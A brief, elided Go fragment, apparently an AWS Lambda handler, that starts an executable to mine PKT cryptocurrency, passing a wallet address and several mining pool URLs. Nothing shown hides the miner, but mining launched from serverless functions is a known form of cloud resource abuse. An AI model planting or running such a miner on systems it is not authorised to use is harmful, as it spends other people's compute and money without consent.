...
func handler(request events.APIGatewayProxyRequest) (*events.APIGatewayProxyResponse, error) {
	...
	cmd := exec.Command(executableFile, "ann", "-p", walletAddress, "http://pool.pkt.world", "http://pool.pktpool.io/diff/8192", "http://pool.pkteer.com", "https://stratum.zetahash.com/d/8192")
	err = cmd.Start()
	if err != nil {
